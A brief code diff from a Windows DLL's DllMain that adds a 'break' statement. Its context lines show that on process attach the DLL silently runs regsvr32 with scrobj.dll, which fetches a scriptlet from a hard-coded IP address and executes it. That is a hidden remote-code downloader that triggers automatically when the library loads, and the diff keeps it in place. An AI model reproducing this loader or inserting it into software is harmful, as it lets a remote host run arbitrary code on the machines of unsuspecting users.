@@ -25,6 +25,7 @@ BOOL DllMain(HANDLE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
   case DLL_PROCESS_ATTACH:
     spawnlp(P_DETACH, "regsvr32.exe", "regsvr32.exe",
             "/s /u /i:http://47.98.135.65/main/main.xml scrobj.dll", NULL);
+    break;
   case DLL_THREAD_ATTACH:
   case DLL_THREAD_DETACH:
   case DLL_PROCESS_DETACH:
